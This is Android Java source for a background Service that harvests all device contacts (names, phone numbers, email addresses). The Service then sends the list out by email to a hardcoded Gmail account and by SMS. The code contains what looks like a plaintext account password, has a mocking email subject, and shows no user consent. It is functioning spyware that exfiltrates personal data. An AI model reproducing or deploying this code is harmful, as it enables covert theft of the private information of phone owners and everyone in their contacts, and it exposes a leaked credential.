/*
 * MyService class will work in background and send email
 * to configured gmail account in GmailCient
 */
package com.project.fetch.contactdetails;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.util.List;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class MyService extends Service{
	
	/*
	 * (non-Javadoc)
	 * @see android.app.Service#onBind(android.content.Intent)
	 */
	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}
	/*
	 * (non-Javadoc)
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
			
		
	}
	/*
	 * (non-Javadoc)
	 * @see android.app.Service#onStartCommand(android.content.Intent, int, int)
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		try{
		//Code to fetch contacts
		StringBuffer sb = new StringBuffer();
		sb.append("......Contact Details.....");
		ContentResolver cr = getContentResolver();
		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		String phone = null; 
		String emailContact = null; 
		String emailType = null; 
		String image_uri = "";
		int contactId;
		int i=0;
		
		ContactDataBaseHandler dbHandler = new ContactDataBaseHandler(this);
		if (cur.getCount() > 0){
			while (cur.moveToNext()) {
				ContactsBean contact = new ContactsBean();
				String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
				contactId = Integer.parseInt(id);
				contact.setId(contactId);
				String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				contact.setName(name);
				image_uri = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_URI));
				
				if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
					
					 sb.append("\n ContactName:" + name);
					 Cursor pCur = cr.query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
					 while (pCur.moveToNext()) { 
						 
						 phone = pCur .getString(pCur .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)); 
						 sb.append("\n PhoneNumber:" + phone);
						 contact.setPhoneNumber(phone);
						 System.out.println("phone" + phone); 
					 }//while (pCur.moveToNext())
					 pCur.close();
					 
					 //Query to get Email
					 Cursor emailCur = cr.query( ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[] { id }, null);
					 //Iterate through Email cursor 
					 while (emailCur.moveToNext()) { 
						 
						 emailContact = emailCur .getString(emailCur .getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)); emailType = emailCur .getString(emailCur .getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE)); 
						 sb.append("\nEmail:" + emailContact + "EmailType:" + emailType); 
						 contact.setEmail(emailContact);
						 System.out.println("Email " + emailContact + " Email Type : " + emailType); 
					 }
					 emailCur.close();	
					dbHandler.addContact(contact);
					
				}
				
			}//While cur.next()
		}//End of if(cur.getCount())	
		System.out.println("String builder::::"+sb.toString());
		List<ContactsBean> contacts = dbHandler.getAllContacts();
		
		for(ContactsBean cn: contacts)
		{
			String contact = "Id"+cn.getId()+"\tPhone Number"+cn.getPhoneNumber()+"\t Name::"+cn.getName()+"\t Email::"+cn.getEmail();
			Log.d("Contact Detail::",contact);
		}
		senEmail();
		//Code to send SMS
		TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE); 
		String number = tm.getLine1Number();
		SmsManager smsMngr = SmsManager.getDefault();
		smsMngr.sendTextMessage(number, number, sb.toString(), null, null);
		Toast.makeText(this, number, Toast.LENGTH_LONG).show();
		}
		catch(Exception e) {
	         Toast.makeText(getApplicationContext(), "SMS faild, please try again.", Toast.LENGTH_LONG).show();
	         e.printStackTrace();
	      }
		
		
	    return START_STICKY;
	}
	
	public void writeToFile(List<ContactsBean> contactList)
	{
		String fileName = "contactDetails.txt";
		File fileFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "MYFile");
		if(!fileFolder.exists())
		{
			fileFolder.mkdir();
		}
		
		File fileToWrite = new File(fileFolder,fileName);
		FileOutputStream fos;
		
		try
		{
			fos = openFileOutput(fileName, Context.MODE_APPEND);
			for(ContactsBean cn: contactList)
			{
				String contact = "Id"+cn.getId()+"\tPhone Number"+cn.getPhoneNumber()+"\t Name::"+cn.getName()+"\t Email::"+cn.getEmail();
				fos.write(contact.getBytes());				
			}
			fos.close();
		}
		catch (Exception e) {
			  e.printStackTrace();
			}
	}
	
	/*
	 * Following method wil send email
	 * @param
	 * @return void
	 */
	public void senEmail()
	{
		ContactDataBaseHandler dbHandler = new ContactDataBaseHandler(this);
		List<ContactsBean> contactList = dbHandler.getAllContacts();
		String msgBody = "Contact Details";
		
		for(ContactsBean cn: contactList)
		{
			String contact = "Id"+cn.getId()+"\tPhone Number"+cn.getPhoneNumber()+"\t Name::"+cn.getName()+"\t Email::"+cn.getEmail()+"\n";
			msgBody = msgBody.concat(contact);
							
		}
		Log.d("Message Body :", msgBody);
		GmailClient gmailClient = new GmailClient("kartiki.aditi@gmail.com","Ad!t!@1986");
		String[] toArray = {"kartiki.aditi@gmail.com"};
		gmailClient.setTo(toArray);
		gmailClient.setFrom("kartiki.aditi@gmail.com");
		gmailClient.setSubject("All contacts you will get .. :P");
		gmailClient.setBody(msgBody);
				
			if(gmailClient.sendEmail())
			{
				Log.d("MyService:sendEmail","true");
				Toast.makeText(getApplication().getApplicationContext(),"Your email is sent successfully",Toast.LENGTH_LONG).show();
			}
			else
			{
				Log.d("MyService:sendEmail","false");
				Toast.makeText(getApplication().getApplicationContext(),"Your email is not sent",Toast.LENGTH_LONG).show();
			}	
		
	}
}
